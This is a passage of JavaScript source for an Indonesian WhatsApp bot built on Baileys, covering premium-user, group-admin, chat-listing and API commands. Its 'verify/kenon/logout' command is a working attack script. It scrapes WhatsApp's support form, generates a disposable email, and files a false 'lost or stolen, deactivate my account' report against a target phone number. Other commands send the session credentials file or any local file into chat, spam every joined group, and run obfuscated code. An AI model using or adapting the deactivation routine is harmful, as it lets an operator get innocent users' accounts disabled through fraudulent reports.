            teksooo += `│\n╰────────────⭓\n\n*Total ada : ${vnnya.length}*`
            newReply(teksooo)
        }
        break
        case 'addprem': {
        let { MessageType } = require('@adiwajshing/baileys');
            if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
function no(number) {
    return number.replace(/\s/g, '').replace(/([@+-])/g, '');
  }

  var hl = [];
  hl[0] = text.split('|')[0];
  hl[0] = no(hl[0]) + "@s.whatsapp.net";
  hl[1] = text.split('|')[1];
    
	conn.sendMessage(m.chat, {
		react: {
			text: '🕒',
			key: m.key,
		}
	})

  if (!text) return reply(`*Example*: .addprem @tag | 100`);
  if (typeof db.data.users[hl[0]] == 'undefined') return reply('User No Database.');

  var jumlahHari = 86400000 * hl[1];
  var now = new Date() * 1;

  global.db.data.users[hl[0]].premium = true;

  if (now < global.db.data.users[hl[0]].premiumDate) global.db.data.users[hl[0]].premiumDate += jumlahHari;
  else global.db.data.users[hl[0]].premiumDate = now + jumlahHari;

  let username = `@${hl[0].split('@')[0]}`;
 	let days = Math.abs(Math.floor((global.db.data.users[hl[0]].premiumDate - new Date()) / (24 * 60 * 60 * 1000)));
			let hours = Math.abs(Math.floor((global.db.data.users[hl[0]].premiumDate - new Date()) / (60 * 60 * 1000))) % 24;
			let minutes = Math.abs(Math.floor((global.db.data.users[hl[0]].premiumDate - new Date()) / (60 * 1000))) % 60;

conn.sendMessage(m.chat, {
		react: {
			text: '🍟',
			key: m.key,
		}
	})
  conn.sendMessage(hl[0], { text: `Kamu Sekarang Premium!!, Jangka Waktu ${days} Hari ${hours} Jam ${minutes} Menit `, mentions: [hl[0]] }, { quoted: fkontak })
  let rs = `sukses ${username} Sudah Premium, Masa Waktu/Jangka Waktu Sudah Terkirim Ke Private Chat ${username}`
  conn.sendMessage(m.chat, { text: rs, mentions: [hl[0]] }, { quoted: fkontak })
}
        break
        
        case 'delprem': {
            if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
function no(number){
    return number.replace(/\s/g,'').replace(/([@+-])/g,'')
  }
  
  if (!text) {
    reply(`*Example*: .delprem @mention/tag`)
    return
  }

  let mentionedJid = m.mentionedJid[0]
  if (!mentionedJid) {
    let annjay = no(text) + "@s.whatsapp.net"
    if (!global.db.data.users[annjay]) {
      reply('User Tidak Ditemukan')
      return
    }
    mentionedJid = annjay
  }

  let user = global.db.data.users[mentionedJid]
  if (!user) {
    reply('User Tidak Ditemukan.')
    return
  }
  
  if (!user.premium) {
    reply('User Tidak Premium!')
    return
  }

  user.premium = false
  user.premiumDate = 0
  let message = `@${mentionedJid.split('@')[0]} Sudah Tidak Premium.`
  conn.sendMessage(m.chat, { text: message, mentions: [mentionedJid] }, { quoted: fkontak })
}
        break

        case 'listprem': {
let response = "乂 *L I S T  P R E M I U M:*\n\n";
	let totalPremium = 0;

	for (let user in global.db.data.users) {
		if (global.db.data.users[user].premium) {
			let number = user.split("@")[0];
			
			let days = Math.abs(Math.floor((global.db.data.users[user].premiumDate - new Date()) / (24 * 60 * 60 * 1000)));
			let hours = Math.abs(Math.floor((global.db.data.users[user].premiumDate - new Date()) / (60 * 60 * 1000))) % 24;
			let minutes = Math.abs(Math.floor((global.db.data.users[user].premiumDate - new Date()) / (60 * 1000))) % 60;

			response += `╭ @${number}\n╰ Expired: ${days} Hari ${hours} Jam ${minutes} Menit\n\n`;

			totalPremium++;
		}
	}

	response += `🍟 Total Premium : *${totalPremium}*`;

conn.sendMessage(m.chat, { text: response, mentions: Object.keys(global.db.data.users).filter(jid => global.db.data.users[jid].premium) }, { quoted: fkontak })
}

        break

        case 'myip': {
        if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        newReply("🔎 My public IP address is: " + ip);
                    })
                })
            }
        break
case 'family100': {
                if ('family100' + m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    return false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100' + m.chat] = {
                    id: 'family100' + m.chat,
                    pesan: await conn.sendText(m.chat, hasil, fkontak),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break        
        case 'listpc': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                let tekslist = `乂 *L I S T  P E R S O N A L  C H A T*\n\n`
                tekslist += `  ◦  *Total Pesan:* ${anu.length} Chat\n`
                for (let i of anu) {
                    let nama = store.messages[i].array[0].pushName
                    tekslist += `╭ *Nama :* ${nama}\n`
                    tekslist += `│ *Pengguna :* @${i.split('@')[0]}\n`
                    tekslist += `╰ *Link:* https://wa.me/${i.split('@')[0]}\n\n`
                    tekslist += `──────────────────────\n\n`
                }
                newReply(tekslist)
            }
        break
        
        case 'listgc': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                let tekslistgc = `乂 *L I S T  G R O U P  C H A T*\n\n`
                tekslistgc += `  ◦  Total Group : ${anu.length} Group\n`
                for (let e of anu) {
                    let metadata = await conn.groupMetadata(e)
                    tekslistgc += `╭ *Nama :* ${metadata.subject}\n`
                    tekslistgc += `│ *Owner Grup :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n`
                    tekslistgc += `│ *ID :* ${metadata.id}\n`
                    tekslistgc += `│ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
                    tekslistgc += `╰  *Member :* ${metadata.participants.length}\n\n`
                    tekslistgc += `──────────────────────\n\n`
                }
                newReply(tekslistgc)
            }
        break
        
        case 'chat': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                if (!q) return newReply('Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
                if (args[0] === 'mute') {
                    conn.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    conn.chatModify({ mute: null }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    conn.chatModify({ archive: true }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    conn.chatModify({ archive: false }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    conn.chatModify({ markRead: true }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    conn.chatModify({ markRead: false }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    conn.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                }
            }
        break
        
        case 'react': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                conn.sendMessage(m.chat, reactionMessage)
            }
        break
        case 'shutdown': {
             if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
			 newReply(`🍟 Sukses, Sayonara;3`)
             await sleep(3000)
             process.exit()
             }
        break
        
case 'verify':
case 'kenon':
case 'logout': {
if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
if (m.quoted || q) {
const froms = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await conn.onWhatsApp(froms)
if (cekno.length == 0) return newReply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
var targetnya = froms.split('@')[0]
try {
var axioss = require('axios')
var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
var $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

var res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
newReply(`🍟 ${targetnya} Sudah Terlogout!`)
} else if (payload.includes(`"payload":false`)) {
newReply(`Terjadi Kesalahan Pada Server.`)
} else newReply(util.format(res.data))
} catch (err) {newReply(`${err}`)}
} else newReply('Masukan Query Nomer Telepon Yang Aktif.!')
}
break

case 'pushmember': case 'jpm': {
if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
if (!text) return newReply(`Teksnya Mana Banh?`)
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let piw = groups.map(v => v.id)
newReply(`🕐 Wait a Moment, Sending Message To ${piw.length} Group`)
for (let i of piw) {
await sleep(2000)
let txt = `${text}${readmore}\nArybotz-MultiDevice`
conn.sendMessage(i, {text: txt})
}
newReply(`Successfully Sending Message 🍟`)
}
break

        case 'join': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                if (!text) return 'No Group Links Detected.!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Group Link is Expired or Invalid.!'
                newReply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await conn.groupAcceptInvite(result).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                reply(`Successfully joining the group!`)
        }
        break
        
        case 'leave': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                newReply(`Goodbye Everyone ${readmore}😄`)
                await sleep(1000)
                await conn.groupLeave(m.chat).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
        }
        break
        
        case 'setexif': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                if (!text) return newReply(`The format you entered is wrong, usage: .setexif packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
let a = `*Exif Sudah Diubah Menjadi:*
    
╭ PackName: global.packname
╰ Author: global.author`     
                newReply(a)
        }
        break
        
        case 'setpp':
        case 'setpp':
        case 'setppbot': {
            function _0x1d19(){var _0x2bf2ef=['4259820vXkaKE','Sukses','89480afqcnZ','w:profile:picture','14DnKvaS','query','557985WFRGrv','856CAraQC','success','downloadAndSaveMediaMessage','test','5UCtsZI','Kirim/Reply\x20Image\x20Dengan\x20Caption\x20','set','unlinkSync','owner','22363110hLRSWH','1954998hCwgXG','picture','image','13034PkdVqU','updateProfilePicture','full','8PPEhfy','ppbot.jpeg','702420tyMrpN'];_0x1d19=function(){return _0x2bf2ef;};return _0x1d19();}var _0x2d2a75=_0x31ee;(function(_0x5beddb,_0x17a0e1){var _0x80bc9d=_0x31ee,_0x3970a4=_0x5beddb();while(!![]){try{var _0x4da0e6=parseInt(_0x80bc9d(0x1ff))/0x1*(-parseInt(_0x80bc9d(0x201))/0x2)+-parseInt(_0x80bc9d(0x1e9))/0x3*(parseInt(_0x80bc9d(0x1fa))/0x4)+-parseInt(_0x80bc9d(0x1ee))/0x5*(parseInt(_0x80bc9d(0x1fd))/0x6)+-parseInt(_0x80bc9d(0x1f7))/0x7*(parseInt(_0x80bc9d(0x1ea))/0x8)+parseInt(_0x80bc9d(0x1f4))/0x9+parseInt(_0x80bc9d(0x1fc))/0xa+parseInt(_0x80bc9d(0x1f3))/0xb;if(_0x4da0e6===_0x17a0e1)break;else _0x3970a4['push'](_0x3970a4['shift']());}catch(_0x322f7a){_0x3970a4['push'](_0x3970a4['shift']());}}}(_0x1d19,0x64cf8));if(!isCreator)return newReply(mess[_0x2d2a75(0x1f2)]);function _0x31ee(_0x4a5085,_0x23d021){var _0x1d199d=_0x1d19();return _0x31ee=function(_0x31ee4c,_0xf0e768){_0x31ee4c=_0x31ee4c-0x1e8;var _0x46be36=_0x1d199d[_0x31ee4c];return _0x46be36;},_0x31ee(_0x4a5085,_0x23d021);}if(!quoted)return newReply(_0x2d2a75(0x1ef)+(prefix+command));if(!/image/[_0x2d2a75(0x1ed)](mime))return newReply(_0x2d2a75(0x1ef)+(prefix+command));if(/webp/[_0x2d2a75(0x1ed)](mime))return newReply(_0x2d2a75(0x1ef)+(prefix+command));var medis=await conn[_0x2d2a75(0x1ec)](quoted,_0x2d2a75(0x1fb));if(args[0x0]==_0x2d2a75(0x1f9)){var {img}=await generateProfilePicture(medis);await conn[_0x2d2a75(0x1e8)]({'tag':'iq','attrs':{'to':botNumber,'type':_0x2d2a75(0x1f0),'xmlns':_0x2d2a75(0x200)},'content':[{'tag':_0x2d2a75(0x1f5),'attrs':{'type':_0x2d2a75(0x1f6)},'content':img}]}),fs[_0x2d2a75(0x1f1)](medis),newReply(mess[_0x2d2a75(0x1eb)]);}else{var memeg=await conn[_0x2d2a75(0x1f8)](botNumber,{'url':medis});fs[_0x2d2a75(0x1f1)](medis),newReply(_0x2d2a75(0x1fe));}
            }
        break
        case 'ambilcase': case 'getcase':
            try{
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                if (!q) return newReply(`Example: ${prefix + command} menu`)
                let caseget = await getCase(q)
                newReply(caseget)
            } catch(err){
            console.log(err)
            newReply(`Tidak Menemukan Case Dengan Nama ${q}.!`)
        }
        break 
        case 'cekapikey':
        
            if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                        if (!text) return newReply(`Input Query`)
            let lol = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${text}`)
            newReply(mess.wait)
            if (lol.message == 'success') {
                let ani = `乂 ${lol.result.username}
                
╭ *🥊 Hit Total:* ${lol.result.requests}
│ *⏳ Hit Today:* ${lol.result.today}
╰ *🧾 Account:* ${lol.result.account_type}

◦  *⌚ Expired:* ${lol.result.expired}`
reply(ani)
                } else newReply('Terjadi Kesalahan Saat Mengambil Result..')
            break

        case 'ambilsesi':
            if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
            newReply('Json Format Session File Is Being Fetched.!')
            let sesi = await fs.readFileSync('./session/creds.json')
            conn.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'session.json' }, { quoted: m })
            reply(`This is your Session File 😗`)
        break
        case 'ambilfile': {
            if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
            if (!q) return reply(`Enter the Input/Query File that you want to retrieve`)
            newReply(`Wait A Moment, Is Fetching File ${q}`)
            let sesi1 = await fs.readFileSync(`./${q}`)
            conn.sendMessage(m.chat, { document: sesi1, mimetype: 'application/json', fileName: `${q}` }, { quoted: m })
}
        break
        case 'autobio':
            if(!isCreator) return newReply(mess.owner)
            if (args.length < 1) return newReply(`Example ${prefix + command} on/off`)
            if (q == 'on'){
                global.db.data.settings[botNumber].autobio = true
                newReply(`🍟 Auto Bio Sekarang Sudah Aktif.!`)
            } else if (q == 'off'){
                global.db.data.settings[botNumber].autobio = false
                newReply(`🍟 Auto Bio Sekarang Dinonaktifkan!`)
            }
        break
        case 'autoread':
            if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
            if (args.length < 1) return newReply(`Contoh ${prefix + command} on/off`)
            if (q === 'on'){
            global.db.data.settings[botNumber].autoread = true
            newReply(`🍟 AutoRead Sekarang Sudah Diaktifkan!`)
            } else if (q === 'off'){
            global.db.data.settings[botNumber].autoread = false
            newReply(`🍟 AutoRead Sekarang Sudah Dinonaktifkan!`)
            }
        break
        
        // Main Menu
        case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = +new Date
                user.afkReason = text
                let afk = `*@${m.sender.split('@')[0]}* Telah Afk Dengan Alasan ${text ? ': ' + text : 'Tidak Ada Alasan'}`
                conn.sendMessage(m.chat, { text: afk, mentions: [m.sender] }, { quoted: fkontak })
            }
            break
case 'txt2img2': {
if (!text) return reply(`Masukan Query/Text Yang Ingin Di Ubah Menjadi Image`)
let generate = `https://api.yanzbotz.my.id/api/text2img/yanzbotz?prompt=${text}`
reply(`Please Wait Generate ${text}`)
conn.sendMessage(m.chat, { image: { url: generate }, caption: `Results From Text ${text} 🍟` })
}
break
case 'aiv': {
if (!text) return reply(`Query Not Found`)
   conn.sendMessage(m.chat, { audio: { url: `https://api.yanzbotz.my.id/api/ai/simivoice?query=${text}` }, mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'whatanime': {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || '';
  if (/image/.test(mime)) {
    conn.sendMessage(m.chat, {
      react: {
        text: '🕒',
        key: m.key,
      }
    });
const media2 = await conn.downloadAndSaveMediaMessage(q)
const anu = await TelegraPh(media2)
    try {
      let api = `https://api.trace.moe/search?anilistInfo&url=${anu}`;
      let { data } = await axios.get(api);
      let anime = data.result[0].anilist;
      let episode = data.result[0].episode;
      let similarity = data.result[0].similarity;
      let at = new Date(data.result[0].from * 1000).toISOString().substr(11, 12) + ' - ' + new Date(data.result[0].to * 1000).toISOString().substr(11, 12);
      let malId = anime.idMal;
      let anilistId = anime.id;
      let titleRomaji = anime.title.romaji;
      let titleNative = anime.title.native;
      let caption = `• *Title:* ${titleRomaji} (${titleNative})
• *Episode:* ${episode}
• *Similarity:* ${(similarity * 100).toFixed(2)}%
• *At:* ${at}`;
      conn.sendMessage(m.chat, { image: { url: anu }, caption: caption })
    } catch (e) {
      console.log(e);
       reply(' Error!')
    }
  } else {
    reply('Please reply to the image')
  }
}
break
case 'chatgptv': case 'chatgptvoice': case 'openaiv': case 'openaivoice': {
if (!text) return reply(`Masukan Query/Text`)
conn.sendMessage(m.chat, { audio: { url: `https://api.yanzbotz.my.id/api/ai/gptvoice?query=${text}` }, mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break

        case 'speedtest': {
                newReply('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) newReply(stdout)
                    if (stderr.trim()) newReply(stderr)
                }
            }
        break
        case 'owner': 
        case 'creator':{
        const repf = await conn.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
let { key } = await conn.sendMessage(from, { text : `Itu Nomer Owner Kontol, Kek Memek, Anjg, Tolol Banget Ke Kontol 🖕`, mentions: [sender]}, { quoted: repf })
await sleep(2000)
conn.sendMessage(from, { text : `Itu Nomer Ownerku Yang Ganteng, Save Ya :3`, edit: key, mentions: [sender]}, { quoted: repf })
}
        break
        case 'ceklimit': 
        case 'checklimit': 
        case 'limit':{
					newReply('Your Limit: ' + (db.data.users[m.sender].limit))
					}
	    break
	    
        case 'runtime':
            	newReply(`乂 *R U N T I M E*\n${runtime(process.uptime())}`)
        break

case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
let dev = ['6285762008398']
let huhu = `乂 *S C R I P T  B O T Z*
Script Ini Tidak Dijual Chat Development Untuk Sewa Bot ${dev}

${global.wm}`
await conn.relayMessage(m.chat,  {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      amount1000: 60000000,
      requestFrom: m.sender,
      noteMessage: {
      extendedTextMessage: {
      text: huhu,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true
      }}}}}}, {})
      }
        break
        
        case 'totalfitur':
        case 'fitur': 
       let a = `
╭ *Total Fitur ${namabot}*
╰ ${totalFitur()}`
            reply(a)
        break
        case 'ping': case 'server': {
            var os = require("os");
            let timestamp = speed()
            let latensi = speed() - timestamp
            let neww = performance.now()
            let oldd = performance.now()
            var { totalmem,
freemem
 } = require('os')

    let ownert = '6285762008398@s.whatsapp.net'
            let respon = `乂 *I N F O R M A T I O N   S E R V E R*\n\n`
respon += `╭ Respon ${latensi.toFixed(4)} Second\n`
respon += `│ Memory: ${Math.round(require('os').totalmem / 1024 / 1024)}MB\n`
respon += `│ Hostname: ${os.hostname()}\n`
respon += `╰ Platform: ${os.platform()}\n\n`
respon += `Server/Host Runtime By @${ownert.split('@')[0]}`
conn.sendMessage(m.chat, { text: respon, mentions: [ownert] }, { quoted: fkontak })
        }
        break        
        // Group Fitur
            case 'kick': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Tidak Bisa Menendang Pengguna, Karna Saya Bukan Admin.`)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'add': {
                                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Tidak Bisa Menambahkan Pengguna, Karna Saya Bukan Admin.!`)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'promote': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Bot Tidak Memiliki Jabatan Admin Dalam Groups Ini.`)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'demote': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                                if (!isBotAdmins) return newReply(`Bot Tidak Memiliki Jabatan Admin Dalam Groups Ini.`)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'block': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.updateBlockStatus(users, 'block').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'unblock': {
                if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.updateBlockStatus(users, 'unblock').then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setname':
            case 'setsubject': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Bot Tidak Memiliki Jabatan Admin Dalam Groups Ini.`)
                if (!text) return 'Text ?'
                await conn.groupUpdateSubject(m.chat, text).then((res) => newReply(mess.success)).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setdesc':
            case 'setdesk': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Bot Tidak Memiliki Jabatan Admin Dalam Groups Ini.`)
                if (!text) return 'Text ?'
                await conn.groupUpdateDescription(m.chat, text).then((res) => newReply(mess.success)).catch((err) => newReply(jsonformat(err)))
            }
            break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc': {
                var _0x50f3e3=_0xe209;(function(_0x3539fb,_0x221968){var _0x415b38=_0xe209,_0x1a0146=_0x3539fb();while(!![]){try{var _0x33922b=parseInt(_0x415b38(0x145))/0x1+parseInt(_0x415b38(0x147))/0x2+parseInt(_0x415b38(0x139))/0x3+parseInt(_0x415b38(0x141))/0x4*(-parseInt(_0x415b38(0x149))/0x5)+parseInt(_0x415b38(0x142))/0x6+-parseInt(_0x415b38(0x138))/0x7*(-parseInt(_0x415b38(0x148))/0x8)+-parseInt(_0x415b38(0x13d))/0x9;if(_0x33922b===_0x221968)break;else _0x1a0146['push'](_0x1a0146['shift']());}catch(_0x4c32cd){_0x1a0146['push'](_0x1a0146['shift']());}}}(_0x2f45,0x93c7b));if(!m[_0x50f3e3(0x14b)])return newReply(mess[_0x50f3e3(0x140)]);if(!isAdmins)return newReply(mess[_0x50f3e3(0x137)]);if(!isBotAdmins)return newReply(mess[_0x50f3e3(0x13e)]);if(!quoted)return newReply(_0x50f3e3(0x136)+(prefix+command));function _0xe209(_0x5361ca,_0x167954){var _0x2f45c1=_0x2f45();return _0xe209=function(_0xe2090e,_0x24b7f4){_0xe2090e=_0xe2090e-0x134;var _0x413c4e=_0x2f45c1[_0xe2090e];return _0x413c4e;},_0xe209(_0x5361ca,_0x167954);}if(!/image/['test'](mime))return newReply(_0x50f3e3(0x136)+(prefix+command));if(/webp/[_0x50f3e3(0x144)](mime))return newReply(_0x50f3e3(0x136)+(prefix+command));function _0x2f45(){var _0x252d0e=['ppgc.jpeg','group','345784EEjJTC','1033890GLprrW','set','test','341680uqcEBF','w:profile:picture','485944EDvvyC','1423832edNMDP','35kvgXDy','image','isGroup','Sukses','chat','/panjang','Kirim/Reply\x20Image\x20Dengan\x20Caption\x20','admin','28vPLIjh','1974081GvpIHd','query','downloadAndSaveMediaMessage','unlinkSync','8248329EDjAsi','botAdmin'];_0x2f45=function(){return _0x252d0e;};return _0x2f45();}var mediz=await conn[_0x50f3e3(0x13b)](quoted,_0x50f3e3(0x13f));if(args[0x0]==_0x50f3e3(0x135)){var {img}=await generateProfilePicture(mediz);await conn[_0x50f3e3(0x13a)]({'tag':'iq','attrs':{'to':m[_0x50f3e3(0x134)],'type':_0x50f3e3(0x143),'xmlns':_0x50f3e3(0x146)},'content':[{'tag':'picture','attrs':{'type':_0x50f3e3(0x14a)},'content':img}]}),fs[_0x50f3e3(0x13c)](mediz),reply('Sukses');}else{var memeg=await conn['updateProfilePicture'](m[_0x50f3e3(0x134)],{'url':mediz});fs['unlinkSync'](mediz),reply(_0x50f3e3(0x14c));}
            }
            break
            case 'tagall': {
                if (!m.isGroup) return newReply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return newReply(mess.admin)
                if (!isBotAdmins) return newReply(`Bot Tidak Memiliki Jabatan Admin Dalam Groups Ini.`)
                let teks = `乂 *P E N G U M U M A N*              
╭──/               
╰ *Pesan : ${q ? q : 'kosong'}*

乂 Tag Semua Member:\n\n`
                for (let mem of participants) {
                    teks += `◦ ${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            }
            break
            case 'hidetag': {
